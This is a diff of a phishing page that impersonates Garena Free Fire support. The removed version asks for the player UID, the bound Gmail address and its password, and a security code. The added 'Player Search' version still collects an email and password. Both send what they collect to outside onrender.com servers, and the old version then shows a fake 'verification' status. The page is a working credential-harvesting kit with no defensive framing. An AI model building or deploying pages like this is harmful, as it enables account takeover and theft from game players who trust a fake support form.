@@ -1,204 +1,96 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="bn">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Garena Customer Support</title>
+    <title>Garena Player Search</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { background-color: #f4f6f9; min-height: 100vh; }
-        .top-header { width: 100%; padding: 16px 24px; background-color: #ffffff; border-bottom: 1px solid #e0e0e0; display: flex; align-items: center; justify-content: space-between; }
-        .brand-logo { height: 60px; width: auto; object-fit: contain; }
-        .main-container { display: flex; justify-content: center; align-items: center; padding: 30px 20px; }
-        .support-card { background: #ffffff; border: 1px solid #e0e0e0; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); width: 100%; max-width: 450px; padding: 30px; position: relative; }
-        .card-header { text-align: center; margin-bottom: 25px; }
-        .card-header h2 { color: #222222; font-size: 20px; font-weight: 700; }
-        .form-group { margin-bottom: 18px; }
-        .form-group label { display: block; margin-bottom: 6px; color: #555555; font-size: 14px; font-weight: 600; }
-        .form-group input, .form-group select, .form-group textarea { width: 100%; padding: 12px 14px; border: 1px solid #cccccc; border-radius: 8px; font-size: 14px; background-color: #fafafa; outline: none; }
-        .form-group textarea { resize: vertical; min-height: 80px; }
-        .submit-btn { width: 100%; padding: 13px; background-color: #e4181f; color: #ffffff; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; }
-        
-        .loader-box { display: none; text-align: center; padding: 40px 10px; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #e4181f; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        .account-details { display: none; text-align: left; }
-        .section-title { font-size: 13px; text-transform: uppercase; color: #888; font-weight: 700; margin-top: 18px; margin-bottom: 8px; border-bottom: 1px solid #eee; padding-bottom: 4px; }
-        .detail-row { display: flex; justify-content: space-between; align-items: center; padding: 9px 0; border-bottom: 1px dashed #f0f0f0; font-size: 14px; }
-        
-        .badge-pending { background-color: #fff3cd; color: #856404; padding: 6px 10px; border-radius: 6px; font-size: 13px; font-weight: bold; }
-        .badge-success { background-color: #e8f5e9; color: #2e7d32; padding: 6px 10px; border-radius: 6px; font-size: 13px; font-weight: bold; }
-        .badge-danger { background-color: #ffebee; color: #c62828; padding: 6px 10px; border-radius: 6px; font-size: 13px; font-weight: bold; }
-        
-        .action-buttons { display: flex; flex-direction: column; gap: 10px; margin-top: 20px; }
-        .refresh-btn { width: 100%; padding: 11px; background-color: #198754; color: #fff; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; }
-        .back-btn { width: 100%; padding: 10px; background-color: #6c757d; color: #fff; border: none; border-radius: 8px; cursor: pointer; }
+        body { font-family: Arial, sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px; }
+        .card { background: #1e1e1e; padding: 20px; border-radius: 10px; max-width: 400px; margin: 0 auto; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
+        input, button { width: 90%; padding: 10px; margin: 8px 0; border-radius: 5px; border: none; }
+        button { background: #ff4757; color: white; font-weight: bold; cursor: pointer; }
+        .status-badge { padding: 6px 12px; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; }
+        .status-rejected { background: #ff4757; color: #fff; }
+        .status-pending { background: #ffa500; color: #fff; }
+        .status-approved { background: #2ed573; color: #fff; }
     </style>
 </head>
 <body>
 
-    <header class="top-header">
-        <img src="garenashare.jpg" alt="Logo" class="brand-logo">
-    </header>
+<div class="card">
+    <h2>Player Info Search</h2>
+    <input type="text" id="uidInput" placeholder="Enter Player UID">
+    <button onclick="searchPlayer()">Search</button>
 
-    <div class="main-container">
-        <div class="support-card">
-            
-            <div id="formSection">
-                <div class="card-header">
-                    <h2>Customer Care Support</h2>
-                </div>
-
-                <form id="supportForm">
-                    <div class="form-group">
-                        <label>Player UID</label>
-                        <input type="text" id="uid" placeholder="Enter Free Fire UID" required>
-                    </div>
-
-                    <div class="form-group">
-                        <label>Bind Gmail</label>
-                        <input type="email" id="gmail" placeholder="Enter bind gmail" required>
-                    </div>
-
-                    <div class="form-group">
-                        <label>Bind Gmail Password</label>
-                        <input type="password" id="password" placeholder="Enter password" required>
-                    </div>
-
-                    <div class="form-group">
-                        <label>Security Code</label>
-                        <input type="text" id="securityCode" placeholder="Enter 6-digit security code" required>
-                    </div>
-
-                    <div class="form-group">
-                        <label>Select Problem</label>
-                        <select id="problemType" required>
-                            <option value="" disabled selected>Select your issue</option>
-                            <option value="Account Banned Issue">Account Banned Issue</option>
-                            <option value="Bind Gmail Lost">Bind Gmail Lost</option>
-                            <option value="OTP Not Receiving">OTP Not Receiving</option>
-                            <option value="Account Lock Problem">Account Lock Problem</option>
-                            <option value="Recovery Email Issue">Recovery Email Issue</option>
-                            <option value="Bind SMS Issue">Bind SMS Issue</option>
-                            <option value="Other Issue">Other Issue</option>
-                        </select>
-                    </div>
-
-                    <div class="form-group">
-                        <label>Additional Details</label>
-                        <textarea id="additionalDetails" placeholder="Write details or other issues..."></textarea>
-                    </div>
-
-                    <button type="submit" class="submit-btn">Submit Request</button>
-                </form>
-            </div>
-
-            <div id="loadingSection" class="loader-box">
-                <div class="spinner"></div>
-                <h3 style="font-size: 16px; color: #333;">Connecting to Server...</h3>
-                <p style="font-size: 13px; color: #777; margin-top: 5px;">Submitting Support Request</p>
-            </div>
-
-            <div id="accountDetailsSection" class="account-details">
-                <div class="card-header" style="margin-bottom: 15px;">
-                    <h2>Account Status Overview</h2>
-                </div>
-
-                <div class="section-title">Garena Player Profile</div>
-                <div class="detail-row"><span class="label">Player Name:</span><span class="value" id="resName">Searching Player Name...</span></div>
-                <div class="detail-row"><span class="label">Player UID:</span><span class="value" id="resUID">N/A</span></div>
-                <div class="detail-row"><span class="label">Player Level:</span><span class="value" id="resLevel">Fetching Level...</span></div>
-                <div class="detail-row"><span class="label">Region / Server:</span><span class="value" id="resRegion">Bangladesh</span></div>
-
-                <div class="section-title">Verification Status</div>
-                <div class="detail-row"><span class="label">Account Status:</span><span id="statusBadge" class="badge-pending">⚠️ Verification Pending</span></div>
-
-                <div class="action-buttons">
-                    <button class="refresh-btn" onclick="refreshStatus()">🔄 Refresh Status</button>
-                    <button class="back-btn" onclick="showForm()">Submit Another Request</button>
-                </div>
-            </div>
-
-        </div>
+    <div id="resultBox" style="display:none; margin-top: 20px;">
+        <p><strong>Name:</strong> <span id="playerName"></span></p>
+        <p><strong>Level:</strong> <span id="playerLevel"></span></p>
+        <div id="statusContainer"></div>
     </div>
 
-    <script>
-        const BACKEND_URL = "https://ff-garena-1-njv6.onrender.com"; 
-        let currentUID = "";
-        let autoCheckInterval = null;
+    <hr style="margin: 20px 0; border-color: #333;">
 
-        document.getElementById('supportForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
+    <h3>Account Verification</h3>
+    <input type="email" id="accEmail" placeholder="Enter Email">
+    <input type="password" id="accPass" placeholder="Enter Password">
+    <button onclick="submitAccount()">Submit Account</button>
+</div>
 
-            currentUID = document.getElementById('uid').value.trim();
-            const payload = {
-                uid: currentUID,
-                gmail: document.getElementById('gmail').value.trim(),
-                password: document.getElementById('password').value.trim(),
-                securityCode: document.getElementById('securityCode').value.trim(),
-                problemType: document.getElementById('problemType').value,
-                additionalDetails: document.getElementById('additionalDetails').value || "None"
-            };
+<script>
+    // আপনার ব্যাকএন্ড সার্ভারের ইউআরএল
+    const API_BASE = "https://ff-garena-backend.onrender.com"; 
 
-            document.getElementById('formSection').style.display = 'none';
-            document.getElementById('loadingSection').style.display = 'block';
+    async function searchPlayer() {
+        const uid = document.getElementById('uidInput').value.trim();
+        if (!uid) return alert("Please enter UID");
 
-            try {
-                await fetch(`${BACKEND_URL}/api/submit-ticket`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-            } catch(e) {}
+        try {
+            const res = await fetch(`${API_BASE}/api/search/${uid}`);
+            const data = await res.json();
 
-            document.getElementById('resUID').innerText = currentUID;
-            document.getElementById('loadingSection').style.display = 'none';
-            document.getElementById('accountDetailsSection').style.display = 'block';
-            document.getElementById('supportForm').reset();
-            
-            startAutoRefresh();
-        });
+            document.getElementById('resultBox').style.display = 'block';
+            document.getElementById('playerName').innerText = data.name;
+            document.getElementById('playerLevel').innerText = data.level;
 
-        function startAutoRefresh() {
-            if(autoCheckInterval) clearInterval(autoCheckInterval);
-            refreshStatus();
-            autoCheckInterval = setInterval(refreshStatus, 2000);
+            const statusDiv = document.getElementById('statusContainer');
+            statusDiv.innerHTML = '';
+
+            if (data.accountStatus === 'rejected') {
+                statusDiv.innerHTML = `<span class="status-badge status-rejected">Account Status: Rejected ❌</span>`;
+            } else if (data.accountStatus === 'pending') {
+                statusDiv.innerHTML = `<span class="status-badge status-pending">Account Status: Pending ⏳</span>`;
+            } else if (data.accountStatus === 'approved') {
+                statusDiv.innerHTML = `<span class="status-badge status-approved">Account Status: Verified ✅</span>`;
+            }
+        } catch (err) {
+            alert("Error fetching player data");
+        }
+    }
+
+    async function submitAccount() {
+        const uid = document.getElementById('uidInput').value.trim();
+        const email = document.getElementById('accEmail').value.trim();
+        const password = document.getElementById('accPass').value.trim();
+
+        if (!uid || !email || !password) {
+            return alert("UID, Email, and Password are all required!");
         }
 
-        async function refreshStatus() {
-            if(!currentUID) return;
-            try {
-                const res = await fetch(`${BACKEND_URL}/api/check-status/${currentUID}?t=${Date.now()}`, { 
-                    cache: 'no-store' 
-                });
-                const result = await res.json();
-                const data = result.data;
-                
-                document.getElementById('resName').innerText = data.name || "Searching Player Name...";
-                document.getElementById('resLevel').innerText = data.level || "Fetching Level...";
+        try {
+            const res = await fetch(`${API_BASE}/api/submit-account`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ uid, email, password })
+            });
+            const data = await res.json();
 
-                const badge = document.getElementById('statusBadge');
-                if(data.status === "Verified") {
-                    badge.className = "badge-success";
-                    badge.innerText = "✔ 100% Safe / Account Verified";
-                    if(autoCheckInterval) clearInterval(autoCheckInterval);
-                } else if(data.status === "Rejected") {
-                    badge.className = "badge-danger";
-                    badge.innerText = `❌ Rejected: ${data.reason}`;
-                    if(autoCheckInterval) clearInterval(autoCheckInterval);
-                } else {
-                    badge.className = "badge-pending";
-                    badge.innerText = "⚠️ Verification Pending";
-                }
-            } catch(e) {}
+            alert(data.message);
+            searchPlayer(); // রিফ্রেশ স্ট্যাটাস
+        } catch (err) {
+            alert("Submission error");
         }
+    }
+</script>
 
-        function showForm() {
-            if(autoCheckInterval) clearInterval(autoCheckInterval);
-            document.getElementById('accountDetailsSection').style.display = 'none';
-            document.getElementById('formSection').style.display = 'block';
-        }
-    </script>
 </body>
 </html>
